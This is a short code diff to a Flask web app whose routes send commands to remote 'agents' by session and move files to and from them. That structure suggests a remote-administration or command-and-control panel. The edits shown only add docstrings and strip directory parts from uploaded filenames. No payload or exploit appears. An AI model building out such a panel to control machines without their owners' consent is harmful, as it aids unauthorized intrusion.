@@ -166,6 +166,7 @@ def upload_file():
 
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
+    """Handle commands including file operations through command interface"""
     data = request.get_json()
     try:
         session_id = int(data.get('session_id'))
@@ -533,6 +534,7 @@ def force_remove_agent():
 
 @app.route('/api/send_file', methods=['POST'])
 def send_file_to_agent():
+    """Handle file upload to agent through GUI interface"""
     try:
         session_id = int(request.form.get('session_id'))
         if 'file' not in request.files:
@@ -549,7 +551,8 @@ def send_file_to_agent():
         
         # Read file data directly from the uploaded file
         file_data = file.read()
-        success, message = bot.upload_file(file_data, file.filename)
+        filename = os.path.basename(file.filename)  # Ensure we only use the filename
+        success, message = bot.upload_file(file_data, filename)
         
         if success:
             return jsonify({
@@ -567,6 +570,7 @@ def send_file_to_agent():
 
 @app.route('/api/download_file', methods=['POST'])
 def download_file_from_agent():
+    """Handle file download from agent through GUI interface"""
     try:
         data = request.get_json()
         session_id = int(data.get('session_id'))
